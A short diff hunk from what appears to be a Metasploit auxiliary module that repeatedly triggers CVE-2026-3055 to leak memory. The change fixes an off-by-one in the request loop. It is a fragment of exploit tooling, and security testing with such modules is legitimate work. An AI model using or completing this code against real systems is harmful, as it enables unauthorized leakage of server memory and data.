@@ -80,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # As we cannot control what we leak, we hit the vuln up to LEAK_REQUEST_COUNT times and hope that we leak
     # something useful during one of those attempts.
-    0.upto(datastore['LEAK_REQUEST_COUNT']) do
+    datastore['LEAK_REQUEST_COUNT'].times do
       # Trigger CVE-2026-3055...
       res = send_request_cgi(
         'method' => 'GET',
